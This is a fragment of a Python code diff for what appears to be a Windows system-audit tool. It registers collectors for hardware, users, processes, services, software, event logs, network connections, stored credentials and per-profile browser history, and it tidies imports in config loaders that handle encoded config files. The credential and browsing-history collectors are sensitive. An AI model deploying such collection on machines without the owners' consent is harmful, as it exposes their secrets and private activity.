+            "mainboard": self._MainboardAudit(), 
+            "os": self._WindowsAudit(),
+            "system_id": self._SystemIdAudit(), 
+            "users": self._UserAudit(), 
+            "credentials": self._CredentialAudit(),
+            "printers": self._PrinterAudit(), 
+            "processes": self._ProcessAudit(), 
+            "services": self._ServiceAudit(),
+            "startup": self._StartupAudit(), 
+            "software": self._SoftwareAudit(),
+            "event_log": self._EventLogAudit(max_events=max_events),
+            "web_history": self._WebHistoryAudit(limit_per_profile=history_limit_per_profile),
+            "connections": self._ConnectionsAudit(),
+        }
+
+
+# --- Config Loader & Saver (Preserved with Backward Compatibility) ---
 
 def load_config(config_path):
     """Nạp file config, hỗ trợ giải mã tự động nếu file được mã hóa (bắt đầu bằng ENC:)."""
-    import base64
     import configparser
     config = configparser.ConfigParser()
     if not os.path.exists(config_path):
@@ -1290,12 +1947,9 @@ def load_config(config_path):
             pass
     return config
 
-
 def save_config(config_path, config_obj, encrypt=False):
     """Ghi config ra file, hỗ trợ mã hóa nếu encrypt=True."""
-    import base64
     import io
-    
     string_io = io.StringIO()
     config_obj.write(string_io)
     plaintext_content = string_io.getvalue()
